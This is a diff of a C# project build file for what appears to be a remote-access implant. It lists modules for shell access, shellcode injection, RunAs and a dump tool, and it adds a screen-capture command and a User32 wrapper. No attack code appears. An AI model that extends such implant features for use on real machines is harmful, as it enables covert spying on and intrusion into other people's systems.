@@ -54,6 +54,7 @@
   <ItemGroup>
     <Reference Include="System" />
     <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
     <Reference Include="System.Management" />
     <Reference Include="System.Runtime.Serialization" />
     <Reference Include="System.ServiceProcess" />
@@ -90,6 +91,7 @@
     <Compile Include="Commands\PrintWorkingDirectory.cs" />
     <Compile Include="Commands\Run.cs" />
     <Compile Include="Commands\RunAs.cs" />
+    <Compile Include="Commands\Screenshot.cs" />
     <Compile Include="Commands\Shell.cs" />
     <Compile Include="Commands\ShellcodeInject.cs" />
     <Compile Include="Commands\TurtleDump.cs" />
@@ -118,6 +120,7 @@
     <Compile Include="Models\HttpCommModule.cs" />
     <Compile Include="Native\Advapi.cs" />
     <Compile Include="Native\Kernel32.cs" />
+    <Compile Include="Native\User32.cs" />
     <Compile Include="Native\Ws2_32.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
@@ -147,6 +150,9 @@
       <Isolated>False</Isolated>
       <EmbedInteropTypes>True</EmbedInteropTypes>
     </COMReference>
+  </ItemGroup>
+  <ItemGroup>
+    <WCFMetadata Include="Connected Services\" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
 </Project>
